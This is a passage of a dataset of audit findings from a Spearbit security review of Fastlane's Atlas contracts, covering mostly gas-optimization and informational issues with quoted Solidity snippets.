Gas Optimization"]}, {"title": "Code duplication in initializeGovernance()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "initializeGovernance() function duplicates the code of _addSignatory(). The only difference is the error message. function initializeGovernance(address controller) external { // ... // Add DAppControl gov as a signatory bytes32 signatoryKey = keccak256(abi.encodePacked(controller, msg.sender)); if (signatories[signatoryKey]) revert AtlasErrors.OwnerActive(); signatories[signatoryKey] = true; dAppSignatories[controller].push(msg.sender); ... } function _addSignatory(address controller, address signatory) internal { bytes32 signatoryKey = keccak256(abi.encodePacked(controller, signatory)); if (signatories[signatoryKey]) revert AtlasErrors.SignatoryActive(); signatories[signatoryKey] = true; dAppSignatories[controller].push(signatory); }", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "ExecutionBase functions contain redundant checks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The functions _contribute(), _borrow(), _transferUserERC20() and _transferDAppERC20() check msg.sender == atlas however the value of this is limited. The real access control check is on the receiving side, e.g. in contribute(), borrow(), transferUserERC20() and transferDAppERC20(). 65 function _contribute(uint256 amt) internal { if (msg.sender != atlas) revert AtlasErrors.OnlyAtlas(); // ... IEscrow(atlas).contribute{ value: amt }(); } function _borrow(uint256 amt) internal { if (msg.sender != atlas) revert AtlasErrors.OnlyAtlas(); IEscrow(atlas).borrow(amt); } function _transferUserERC20(address token, address destination, uint256 amount) internal { if (msg.sender != atlas) { revert AtlasErrors.OnlyAtlas(); } IPermit69(atlas).transferUserERC20(token, destination, amount, _user(), _control(), _config(), _lockState()); ,! } function _transferDAppERC20(address token, address destination, uint256 amount) internal { if (msg.sender != atlas) { revert AtlasErrors.OnlyAtlas(); } IPermit69(atlas).transferDAppERC20(token, destination, amount, _user(), _control(), _config(), _lockState()); ,! } Functions in Atlas: function contribute() external payable { if (lock != msg.sender) revert InvalidExecutionEnvironment(lock); // ... } function borrow(uint256 amount) external payable { if (lock != msg.sender) revert InvalidExecutionEnvironment(lock); // ... } function transferUserERC20(...) ... { _verifyCallerIsExecutionEnv(user, controller, callConfig); // ... } function transferDAppERC20(...) ... { _verifyCallerIsExecutionEnv(user, controller, callConfig); // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "latestTimestamp() can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function latestTimestamp() calls BASE_FEED.latestTimestamp() twice. storage variable atlasLatestTimestamp twice, which is relatively expensive. This can be optimized. It also accesses the uint256 public atlasLatestTimestamp; function latestTimestamp() public view returns (uint256) { if (BASE_FEED.latestTimestamp() >= atlasLatestTimestamp) { return BASE_FEED.latestTimestamp(); // second call } else { return atlasLatestTimestamp; // second access } }", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "_getSortingData() can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "_verifySolverEligibility() is called in a loop and every time calls getUserOperationHash(). As getUserOperationHash() is a relative expensive function and the input is always the same, it would be cheaper to do this outside the loop. function _getSortingData(/*...*/ ) /*...*/ { // ... for (; i < count;) { if (/*...*/ && _verifySolverEligibility(dConfig, userOp, solverOps[i])) { // ... } else { // ... } // ... } // ... } function _verifySolverEligibility(/*...*/ ) /*...*/ { // ... bytes32 userOpHash = CallVerification.getUserOperationHash(userOp); // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "sortBids() can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function sortBids() calculates count -invalid twice. This can be optimized, while also increases readability. function sortBids(/*...*/ ) /*...*/ { // ... SolverOperation[] memory solverOpsSorted = new SolverOperation[](count - invalid); count -= invalid; // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "factoryWithdrawERC20() and factoryWithdrawEther() are unused", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The functions factoryWithdrawERC20() and factoryWithdrawEther() are not called from Atlas. Note: they could be called via a userOp in combination with delegatecall and this issue: \"validControl / only- AtlasEnvironment are not effective in delegatecall situation\". This poses no extra risk because the ExecutionEnvironment call already can access the funds. function factoryWithdrawERC20(address msgSender, address token, uint256 amount) external { require(msg.sender == atlas, \"ERR-EC10 NotFactory\"); require(msgSender == _user(), \"ERR-EC11 NotEnvironmentOwner\"); require(ISafetyLocks(atlas).isUnlocked(), \"ERR-EC15 EscrowLocked\"); if (ERC20(token).balanceOf(address(this)) >= amount) { SafeTransferLib.safeTransfer(ERC20(token), _user(), amount); } else { revert(\"ERR-EC02 BalanceTooLow\"); } } function factoryWithdrawEther(address msgSender, uint256 amount) external { require(msg.sender == atlas, \"ERR-EC10 NotFactory\"); require(msgSender == _user(), \"ERR-EC11 NotEnvironmentOwner\"); require(ISafetyLocks(atlas).isUnlocked(), \"ERR-EC15 EscrowLocked\"); if (address(this).balance >= amount) { SafeTransferLib.safeTransferETH(_user(), amount); } else { revert(\"ERR-EC03 BalanceTooLow\"); } } 68", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Moving validateBalances() to Atlas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Currently there is some back and forth calling between the ExecutionEnvironment, the Solver and Altas. This is complicated, has overhead and is potentially risky. function solverMetaTryCatch( // Execute the solver call. // which calls  IEscrow(_atlas).reconcile  if (endBalance > 0) { IEscrow(atlas).contribute{ value: endBalance }(); } (, success) = IEscrow(atlas).validateBalances(); if (!success) { revert AtlasErrors.BalanceNotReconciled(); } }", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "_executeSolverOperation() executes the same line twice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In _executeSolverOperation() the statement key.solverOutcome = uint24(result) might be done twice in certain situations. 69 function _executeSolverOperation(/*...*/ ) /*...*/ { // ... if (result.canExecute()) { // ... if (result.canExecute() && _trySolverLock(solverOp)) { // ... key.solverOutcome = uint24(result); if (result.executionSuccessful()) { // ... return (true, key); } } } key.solverOutcome = uint24(result); // has been done before in certain situations // ... return (false, key); }", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Assign with or operator (|=) can be reduced", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In function _executeSolverOperation() result is verified to be 0 before calling _solverOpWrap- per(), so the or operator (|) is not necessary. function _executeSolverOperation(/*...*/ ) /*...*/ { // ... if (result.canExecute() && _trySolverLock(solverOp)) { // result is now 0 // ... result |= _solverOpWrapper(...); // | not necessary // ... } // ... } 70 In _validateSolverOperation() the value is returned directly so no need to first assign it to result. function _validateSolverOperation(/*...*/ ) /*...*/ { // ... return (result |= 1 << uint256(SolverOutcome.CallValueTooHigh), gasLimit); // = not necessary // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Parameter of manuallyUpdateNonceTracker() not necessary", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function manuallyUpdateNonceTracker() enforces the parameter account to be equal msg.sender. In that case supplying account isn't necessary. to function manuallyUpdateNonceTracker(address account) external { if (msg.sender != account) revert AtlasErrors.OnlyAccount(); // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Nonce logic is complicated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The logic to handle async nonces is rather complicated and thus relative gas intensive. This is mainly done to be able to do getNextNonce() onchain. This approach is not foul proof either because one of the nonces might already be in transit without any onchain updates. Also see issues:  Workaround manuallyUpdateNonceTracker() might not work.  Function manuallyUpdateNonceTracker() can miss blocks that are not completely filled. 71 One example: function _handleNonces(address account, uint256 nonce, bool async, bool isSimulation) internal returns ,! (bool) { // ... // ASYNC NONCES uint256 bitmapIndex = ((nonce - 1) / 240) + 1; uint256 bitmapNonce = ((nonce - 1) % 240); bytes32 bitmapKey = keccak256(abi.encode(account, bitmapIndex)); NonceBitmap memory nonceBitmap = nonceBitmaps[bitmapKey]; uint256 bitmap = uint256(nonceBitmap.bitmap); if (_nonceUsedInBitmap(bitmap, bitmapNonce)) { return false; } // ... bitmap |= 1 << bitmapNonce; nonceBitmap.bitmap = uint240(bitmap); if (bitmapNonce + 1 > uint256(nonceBitmap.highestUsedNonce)) { nonceBitmap.highestUsedNonce = uint8(bitmapNonce + 1); } if (bitmap == FULL_BITMAP) { if (bitmapIndex == nonceTracker.highestFullAsyncBitmap + 1) { nonceTracker = _incrementHighestFullAsyncBitmap(nonceTracker, account); } } nonceBitmaps[bitmapKey] = nonceBitmap; // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "userWrapper() considers entire balance instead of msg.value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "userWrapper() is called such that msg.value == userOp.value: (success, userData) = environment.call{ value: userOp.value }(userData); However, userWrapper() validates userOp.value against address(this).balance: require(address(this).balance >= userOp.value, \"ERR-CE01 ValueExceedsBalance\"); ExecutionEnvironment can have some ETH balance already since it as receive() function. Thus, address(this).balance >= msg.value. Reading address(this).balance is more expensive operation than reading msg.value. 72 Thus, checking against msg.value is technically more accurate and also cheaper.", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "netGasSurcharge is declared twice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "netGasSurcharge is a named return variable, but it's declared again later. function _settle(/*...*/ ) /*...*/ returns (/*...*/ , uint256 netGasSurcharge) { // ... uint256 netGasSurcharge = (_claims * SURCHARGE) / 10_000_000; // declared again // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Cache variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Highlighted areas are where variables can be cached to avoid reading from storage more than once.  ChainlinkDAppControl.sol#L153: verificationVars[baseChainlinkFeed] can be extracted in a storage variable to avoid getting its value in each loop.  ChainlinkDAppControl.sol#L219: signers.length is read for each iteration.  ChainlinkDAppControl.sol#L206-L207: last signer is read twice.  SwapIntent.sol#L146-L150: swapIntent.conditions.length is read twice.", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "No need to check for signature length", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "there's no need for this check: if (dAppOp.signature.length == 0) return false; if (userOp.signature.length == 0) return false; recover() does this check already. If tryRecover() is used instead as suggested in the issue \"Use tryRecover() for signature verification\" is followedtryRecover(), it won't throw on invalid signature.", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Only one ...get...Hash() function uses calldata", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function _getSolverHash() uses a calldata, but other comparable functions use memory, which costs more gas. All functions could use calldata. function _getSolverHash(SolverOperation calldata solverOp) /*...*/ { } function _getProofHash(DAppOperation memory approval) /*...*/ { } function _getProofHash(UserOperation memory userOp) /*...*/ { } function getUserOperationHash(UserOperation memory userOp) /*...*/ { } function getAltOperationHash(UserOperation memory userOp) /*...*/ { }", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Async vs sequential vs sequenced", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "There are multiple terms to indicate the same concept, which can be confusing:  async  sequential  sequenced Especially combined with negating (!) the values, the risk for confusion increases. function _verifyDApp( // ... if (!_handleNonces(..., !dConfig.callConfig.needsSequencedDAppNonces(), ...)) { // uses ! // ... } // ... } function _verifyUser( // ... if (!_handleNonces(..., !dConfig.callConfig.needsSequencedUserNonces(), ...)) { // uses ! // ... } // ... } function _handleNonces(/*...*/ , bool async, /*...*/ ) internal returns (bool) { // ... if (!async) { // uses ! // SEQUENTIAL NONCES // ... } else { // ASYNC NONCES // ... } } /// @param sequenced A boolean indicating if the nonce should be sequential (true) or async (false). function getNextNonce(..., bool sequenced) external view returns (uint256) { // ... } function needsSequencedUserNonces(...) internal pure returns (bool sequenced) { // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Checks in function _verifyDApp() can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function _verifyDApp() defines and assigns the variable bypassSignatoryCheck twice with the same value. This can be optimized. The first time the variable isn't used, which means simulation mode isn't handled optimally. This might allow transactions to be bundled that waste gas. function _verifyDApp( // ... bool bypassSignatoryCheck = isSimulation && dAppOp.from == address(0); // not used if (!isSimulation) { // should probably be bypassSignatoryCheck return (false, ValidCallsResult.InvalidBundler); } // ... bool bypassSignatoryCheck = isSimulation && dAppOp.from == address(0); // same value as above if (!bypassSignatoryCheck) { return (false, ValidCallsResult.DAppSignatureInvalid); } // ... if (dAppOp.from == address(0) && isSimulation) { return (true, ValidCallsResult.Valid); } } The situation where dAppOp.from == address(0) would be true only for simUserOperation() calls via the Sim- ulator (because these sims may be done before a dAppOp is available, so will not be able to check e.g. dapp sig or dapp nonce) and not for simulations involving solverOp(s), as those take a dAppOp param, so those dAppOp properties can be checked.", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Mimic can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Any call to ExecutionEnvironment goes through Mimic which appends userOp.from, control, call config, control.codehash to the calldata: library 0xaAaAaAaaAaAaAaaAaAAAAAAAAaaaAaAaAaaAaaAa is standin for the ExecutionEnvironment, which is a de facto ,! 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB is standin for the user 0xCcCCccccCCCCcCCCCCCcCcCccCcCCCcCcccccccC is standin for the dApp control address 0x2222 is standin for the call configuration 0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee is the dApp control contract ,! s EOA address s   .codehash This is to ensure that a unique ExecutionEnvironment is deployed for this combination and also to verify that correct parameters are passed to any external call to ExecutionEnvironment. Including these parameters in the create2 salt ensures the uniqueness of deployment address. Also, since Exe- cutionEnvironment can only be called from atlas, we can be sure that correct parameters are passed assuming correct code. Thus, the verification steps like the following can be skipped: if (userOp.from != _user()) { revert(\"ERR-CE02 InvalidUser\"); } Here, _user() parses user address from the appended calldata. Thus, following this logic, we can remove appending userOp.from, control, call config to the calldata as they all can be retrieved from function arguments already. control.codehash is used for the following check: modifier validControlHash() { if (_control().codehash != _controlCodeHash()) { revert(\"ERR-EV008 InvalidCodeHash\"); } _; } This check is to account for the possibility of changing the code via selfdestruct? With Dencun upgrade, selfdestruct can destroy the code only when called in the creation tx (rollups and other EVM chains haven't upgraded to Dencun yet). However, there are cases where this check doesn't provide any protection against:  If control is a proxy, the implementation can change without changing its codehash.  control can change its execution without using proxy by detecting which stage Atlas is in. By calling solver- MetaTryCatch and checking it's in lock state or not. Although, with this malicious behavior, it likely won't be used by an honest user or an honest dapp.  control can also change its behavior based on its state which isn't included in codehash. Also see:  Function _getMimicCreationCode relies on Solidity format for offsets  Function _getMimicCreationCode relies on Solidity format for layout", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Passing of key can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Some functions (like _executeSolverOperation() and _allocateValue()) do:  Pass key as a parameter.  Do key.hold...Lock() inside the function.  Do key.pack() inside the function.  Return key. One function _getBidAmount() does:  Pass key as a parameter.  Do key.hold...Lock() inside the function.  Do key.pack() inside the function.  It doesn't return key, but key is still updated. Other functions (like _executePreOpsCall(), _executeUserOperation(), _executePostOpsCall() ) do:  Do key.hold...Lock() before the call.  Pass key.pack() as a parameter. Some functions (like _bidFindingIteration(), _bidKnownIteration(), holdPreOpsLock(), holdUserLock(), holdSolverLock(), holdAllocateValueLock(), holdPostOpsLock() ) do:  Pass key as a parameter. 78  Return key. The main reasons for the differences are the \"stack too deep\" error. However it would be more consistent and easier to read if the same pattern is used everywhere.", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Code duplications for call to _allocateValue()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Both _bidFindingIteration() and _bidKnownIteration() are called from execute() and each calls _allocateValue(). It is more logical to do the calls to _allocateValue() from execute() because that is also the place where _executePostOpsCall() is called. This also reduces code duplication and thus reduces deployment size and cost. function execute(/*...*/ ) /*...*/ { // ... if (dConfig.callConfig.exPostBids()) { (auctionWon, key) = _bidFindingIteration(dConfig, userOp, solverOps, returnData, key); } else { (auctionWon, key) = _bidKnownIteration(dConfig, userOp, solverOps, returnData, key); } if (!auctionWon) { // ... } // else /*...*/ this would be a good place to call _allocateValue() // ... bool callSuccessful = _executePostOpsCall(auctionWon, returnData, key); // ... } function _bidFindingIteration(/*...*/ ) /*...*/ { // ... (auctionWon, key) = _executeSolverOperation(/*...*/ ); 79 if (auctionWon) { key = _allocateValue(dConfig, solverOps[bidPlaceholder], bidAmounts[bidPlaceholder], ,! returnData, key); key.solverOutcome = uint24(bidPlaceholder); return (auctionWon, key); } // ... } function _bidKnownIteration(/*...*/ ) /*...*/ { // ... (auctionWon, key) = _executeSolverOperation(/*...*/ ); if (auctionWon) { key = _allocateValue(dConfig, solverOp, solverOp.bidAmount, returnData, key); key.solverOutcome = uint24(i); return (auctionWon, key); } // ... } function _executeSolverOperation(/*...*/ ) /*...*/ { // ... if (result.executionSuccessful()) { key.solverSuccessful = true; return (true, key); // auctionWon = true } // ... } Also see:  Locking mechanism is complicated", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Use _deposits instead of the storage variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "deposits is a storage variable and its value is already copied in stack at _deposits. deposits is still used to read the value.", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "if conditions always pass", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "reconcile() first enforces a condition, then does two if conditions on the same boolean expression: if (calledBack) revert DoubleReconcile(); // ... if (/*...*/ ) { if (!calledBack) { _solverLock = uint256(uint160(currentSolver)) | _solverCalledBack; } // ... } // ... if (!calledBack || !fulfilled) { calledBack is always false when the execution reaches these if conditions, otherwise it'd revert.", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "keccak can be computed at compile time", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Following hash is computed at every permit() call: keccak256( \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\" ), This hash can be calculated once and reused since this value is known at compile time.", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Structs can be kept in storage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Highlighted code above follow a similar pattern. They copy a storage struct to memory, make changes to it, and then use the copy to update back the storage struct. One example: EscrowAccountAccessData memory aData = accessData[owner]; aData.bonded -= amt; aData.lastAccessedBlock = uint32(block.number); accessData[owner] = aData; This has extra gas overhead as the entire struct is copied from and to storage just to update a few struct members. Keeping the struct in storage avoids this overhead.", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Replace pendingSurchargeRecipient with msg.sender", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "pendingSurchargeRecipient is read multiple times. after it's checked they are equal. Its usage can be replaced with msg.sender", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "SafeMath can be skipped for Solidity 0.8", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Solidity 0.8 has checked math, so SafeMath isn't necessary.", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Simulation code path can be kept off-chain", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Removing simulation mode from contracts simplifies the protocol (removing a lot of branching) and also reduces gas usage.", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "callSequenceHash can be gas-optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The way callSequenceHash is calculated can be changed to reduce its gas consumption. The off-chain software to calculate this hash can be updated too, to match the new onchain version.", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "preSolverCall() can revert instead of returning false", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Decoding return data from preSolverCall() can be avoided if it reverts instead of returning false. bytes memory data = forwardSpecial( abi.encodeWithSelector(IDAppControl.preSolverCall.selector, solverOp, returnData), ExecutionPhase.PreSolver ); (success, data) = control.delegatecall(data); if (!success) { revert AtlasErrors.PreSolverFailed(); } success = abi.decode(data, (bool)); if (!success) { revert AtlasErrors.PreSolverFailed(); } Note: abi.decode() itself can also revert it the supplied data is in an incorrect format.", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Cache withdrawals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The highlighted code can be optimized to avoid calculating new withdrawal amount and reading storage variable withdrawals twice.", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "metacall() sends msg.value without need", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The function metacall() calls this.execute() and sends msg.value. Because execute() is in the same contract this keeps the same amount of ETH in the contract. The administration msg.value is done via _setAtlasLock() and deposits, so that is no reason to send msg.value. Note: It would be relevant to send msg.value if execute() was located in another contract. In that case it might be more logical to send userOp.value than msg.value. function metacall(/*...*/ ) /*...*/ { // ... _setAtlasLock(executionEnvironment, gasMarker, userOp.value); try this.execute{ value: msg.value }(/*...*/ ) // ... function _setAtlasLock(address executionEnvironment, uint256 gasMarker, uint256 userOpValue) internal { // ... deposits = msg.value; }", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "Consider documenting why specific AtlETH balances types are used in _assign()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In the _assign() function, the solver has their AtlETH balance reduced. Specifically their .bonded balance of AtlETH is reduced first, and if that alone is insufficient, their .unbonding balance of AtlETH is reduced as well. If both amounts combined are still insufficient, the function will not draw from the solver's regular .balance of AtlETH, and instead will return isDeficit == true. The reason for this behavior is likely that a solver's regular .balance of AtlETH is meant to be independent and not used within an Atlas transaction. In this case, it may be worth explicitly documenting this so the code can be easily understood.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "callIndex and callCount don't track the allocateValue() call", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The callIndex variable tracks the number of calls that have been executed (or skipped, depending on the callConfig) during an Atlas transaction. The callCount variable tracks the total number of calls that may be executed during the transaction. However, neither variable tracks the call to the allocateValue() function. It may be desirable to include this in the count, as certain DAppControl contracts may find this useful.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Loop counter can be declared with for statement", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Above code declares the for loop counter as a separate variable: uint256 i; for(;/*...*/ ; i++) { // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "TODOs left in the code", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "There are TODO comments present in the code. These include:  Atlas.sol#L58: // NOTE: Currently reverting instead of graceful return to help w/ testing. TODO - still ,! reverting?  Atlas.sol#L141: // TODO: point key.addressPointer at bundler if all fail.  AtlasVerification.sol#L332-L337: // TODO: consider dapp-owned gas escrow. Enshrined account // abstraction may render that redundant at a large scale, but // allocating different parts of the tx to different parties // will allow for optimized trustlessness. This could lead to // users not having to trust the front end at all - a huge // improvement over the current experience.  AtlasVerification.sol#L545: Note that this would be addressed by the issue \"Call to validateUserOp() won't work\". // TODO: not sure if 30k gas limit is accurate  Escrow.sol#L290: // NOTE: Turn this into time stamp check for FCFS L2s? 87  Escrow.sol#L379: Note that a full uint256 does appear safe from overflow in the current code. sub(mload(data), 32) // TODO: make sure a full uint256 is safe from overflow  Factory.sol#L174: Note that this would be solved by the issue \"Mimic can be optimized\". // TODO: unpack the SHL and reorient  GasAccounting.sol#L271: Note that this would be solved by the issue \"Consider penalizing bundlers for unused gas\". // TODO: consider penalizing bundler for too much unused gas (to prevent high escrow ,! requirements for solvers)  GasAccounting.sol#L284: Note that this is related to the issue \"Incorrect SURCHARGE multiplication\". // TODO: make sure this works w/ the surcharge 10%  Storage.sol#L80: // TODO remove these when transient storage behaviour is implemented  ExecutionBase.sol#L50: // TODO: simplify this into just the bytes  ExecutionBase.sol#L74: // TODO: simplify this into just the bytes  SwapIntent.sol#L101: // TODO: If user is Selling Eth, convert it to WETH rather than rejecting.  SwapIntent.sol#L103: // TODO: Could maintain a balance of \"1\" of each token to allow the user to save gas over ,! multiple uses  SwapIntent.sol#L190-L191: // TODO: Permit69 is currently enabled during solver phase, but there is low conviction that ,! this // does not enable an attack vector. Consider enabling to save gas on a transfer?  ChainlinkAtlasWrapper.sol#L7: import \"forge-std/Test.sol\"; //TODO remove  SafetyBits.sol#L6-L8: // TODO remove //import {TestUtils} from \"../../../test/base/TestUtils.sol\"; // import \"forge-std/Test.sol\";  SafetyBits.sol#L111: 88 self.addressPointer = address(0); // TODO: Point this to bundler (or builder?) if all solvers ,! fail", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Bundlers reimburse themselves if all solvers fail", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "If an Atlas transaction interacts with a DAppControl that specifies needsFulfillment() == false, it's possible that all solverOps fail and auctionWon == false will be returned from the execute() function. If this happens, the bundler will be treated as the winning solver in the _settle() function: (uint256 ethPaidToBundler, uint256 netGasSurcharge) = _settle({ winningSolver: auctionWon ? solverOps[winningSolverIndex].from : msg.sender, bundler: msg.sender }); This implies that bundlers can be required to reimburse themselves for gas costs, which can be inefficient if they don't have an existing AtlETH balance to temporarily draw from. This also means that a bundler would be paying the surcharge on gas costs, which can introduce a motivation to intentionally revert the entire transaction to avoid this (which can be achieved with a revert during the final safeTransferETH() call).", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Which party should receive the surplus ETH?", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "_validCalls() allows to be more ETH supplied than required (e.g. msg.value > userOp.value). The difference is apperent in withdrawals and deposits. _settle() will give this difference to the winning solver or to msg.sender (e.g. the bundler). In case of an error all the ETH is send to msg.sender (e.g. the bundler). Perhaps it is more logical to send the difference to msg.sender (e.g. the bundler). function _validCalls(/*...*/ ) /*...*/ { // ... // Check that the value of the tx is greater than or equal to the value specified if (msgValue < userOp.value) { return (userOpHash, ValidCallsResult.TxValueLowerThanCallValue); } // ... } function metacall(/*...*/ ) /*...*/ { // ... _setAtlasLock(executionEnvironment, gasMarker, userOp.value); try this.execute{ value: msg.value }(dConfig, userOp, solverOps, executionEnvironment, msg.sender, userOpHash) ,! 89 returns (bool _auctionWon, uint256 winningSolverIndex) { (uint256 ethPaidToBundler, /*...*/ ) = _settle({ /*...*/ , bundler: msg.sender }); } catch (bytes memory revertData) { ... // Refund the msg.value to sender if it errored if (msg.value != 0) SafeTransferLib.safeTransferETH(msg.sender, msg.value); } } function _settle(/*...*/ ) /*...*/ { // ... if (_deposits < _claims + _withdrawals) { // ... if (_assign(winningSolver, amountOwed, true, false)) { revert /*...*/ ; } } else { // ... _credit(winningSolver, amountCredited); } // ... SafeTransferLib.safeTransferETH(bundler, _claims); // ... } function _setAtlasLock(address executionEnvironment, uint256 gasMarker, uint256 userOpValue) internal { // ... withdrawals = userOpValue; deposits = msg.value; }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "No error code for failed _trySolverLock()", "html_url": 